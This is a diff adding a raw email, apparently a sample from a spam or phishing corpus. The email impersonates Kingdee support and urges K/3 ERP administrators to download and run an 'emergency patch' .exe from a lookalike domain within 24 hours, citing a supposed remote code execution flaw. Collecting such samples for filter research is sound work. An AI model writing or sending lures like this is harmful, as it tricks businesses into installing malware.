@@ -1,0 +1,29 @@
+Return-Path: <support@kingdee-service.com>
+Received: from kingdee-service.com (host.gd.vnet.cn [121.10.141.201])
+	by spam-gw.ccert.edu.cn (MIMEDefang) with ESMTP id j9F2uP5t022198
+	for <admin@example.com>; Sun, 08 Jun 2025 22:15:18 +0800 (CST)
+Message-ID: <202506082215.j9F2uP5t022198@spam-gw.ccert.edu.cn>
+From: =?GB2312?B?s9K4+A==?= <support@kingdee-service.com>
+Subject: =?gb2312?B?uqvK1NDQo6zL+NDo0MLTxc+1seM=?=
+To: admin@example.com
+Content-Type: text/plain;charset="GB2312"
+Reply-To: support@kingdee-service.com
+Date: Sun, 08 Jun 2025 22:15:17 +0800
+X-Priority: 4
+X-Mailer: FoxMail 3.11 Release [cn]
+
+补丁信息如下：
+
+软件名称：金蝶ERP K/3 系统紧急安全补丁
+软件版本：KB20250608
+建议分类：安全更新
+联系EMAIL：security.kingdee@126.com
+软件网站：http://www.kingdee-support-cn.com/notice_info.asp?id=20250608
+下载地址：http://down.kingdee-support-cn.com/patch.asp?name=KB20250608.exe
+软件容量：875 KB
+软件类型：升级补丁
+应用平台：windows server 2008/2012
+界面预览：无
+软件介绍：
+尊敬的金蝶用户：我们发现K/3系统存在一处高危远程代码执行漏洞（编号CVE-2025-8888），可能导致服务器被入侵，数据泄露。请您立即下载并安装本紧急安全补丁。安装过程简单，双击运行即可，无需重启服务器。为保障您的企业数据安全，请务必在24小时内完成更新。给您带来的不便敬请谅解。技术支持qq:12345888。
+为您的系统安全保驾护航。
